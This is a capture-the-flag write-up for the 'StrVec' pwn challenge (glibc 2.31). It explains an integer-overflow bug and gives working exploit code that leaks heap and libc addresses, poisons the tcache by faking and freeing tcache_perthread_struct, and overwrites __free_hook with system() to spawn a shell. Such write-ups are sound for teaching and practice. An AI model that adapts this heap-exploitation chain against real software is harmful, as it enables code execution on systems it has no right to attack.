# StrVec

## TLDR
### Vulnerability
* Integer overflow
### How to attack
* tcache poisoning
* overwrite tcache\_perthread\_struct

## Challenge
### Description
result of file command
* Arch    : x86-64
* Library : Dynamically linked
* Symbol  : Not stripped

result of checksec
* RELRO  : Full RELRO
* Canary : Enable
* NX     : Enable
* PIE    : Enbale

libc version: 2.31
### Exploit 
At first, we can trigger integer overflow giving n = 0x7fffffff.  
Then we can free any address.  


But, we must call malloc() before calling free(), and we can only call malloc() with size 0x30.  
It makes this challenge harder exploit. It is difficult to link any address to tcache.  


To avoid this restriction, we make fake chunk which size is 0x290 that is same as tcache\_perthread\_struct, and free.  
And we also free the address of tcache\_perthread\_struct.  As a result "count" member of tcache\_perthread\_struct was overwritten to huge value(the address of heap).  
So now we can exploit with tcache poisoning attack.  

A part of exploit
```
def get(idx):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(" = ", str(idx))
	conn.recvuntil("-> ")

def create(idx, data):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter(" = ", str(idx))
	conn.sendafter(" = ", data)

def exploit():
	conn.sendlineafter(": ", "name")	
	conn.sendlineafter("n = ", str(0x7fffffff))

	# heap address leak
	create(3, "\n")
	get(3)
	addr_heap = conn.recvline()[:-1]
	heap_base = u64(addr_heap+b"\x00"*(8-len(addr_heap))) - 0x2c0
	print(hex(heap_base))

	create(0, b"/bin/sh\x00"+p64(0x441)+b"\n") 			# prepare to get a shell , make fake size header
	create(1, p64(heap_base+0x2c0+0x40)+p64(heap_base+0x2c0+0x40)+b"\n")
	payload = p64(0)
	payload += p64(0x291)								# fake header
	payload += p64(0)
	payload += p64(0x291)								# fake header
	for i in range(22):
		create(21+i*6, payload[:-1])
	create(15, "\n")									# free fake chunk(size=0x440)
	get(16)												
	
	# libc address leak
	libc_unsorted = conn.recvline()[:-1]
	libc_base = u64(libc_unsorted+b"\x00"*(8-len(libc_unsorted))) - off_unsorted
	libc_free_hook = libc_base + off_free_hook
	libc_system = libc_base + off_system
	print(hex(libc_base))
	
	payload = p64(heap_base+0x3c0)
	payload += p64(heap_base+0x10)
	create(3, payload+b"\n") 		# allocate from unsorted
	create(3, payload+b"\n")
	create(4, b"\n")
	create(35, p64(libc_free_hook-0x8)+b"\n")
	create(5, b"\n")
	create(6, b"\n")
	create(7, p64(0)+p64(libc_system)+b"\n")
	conn.sendlineafter("> ", "3")	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
```

My exploit code is [solve.py](https://github.com/kam1tsur3/2021_CTF/blob/master/asis/pwn/strvec/solve.py).

## Reference

twitter: @kam1tsur3
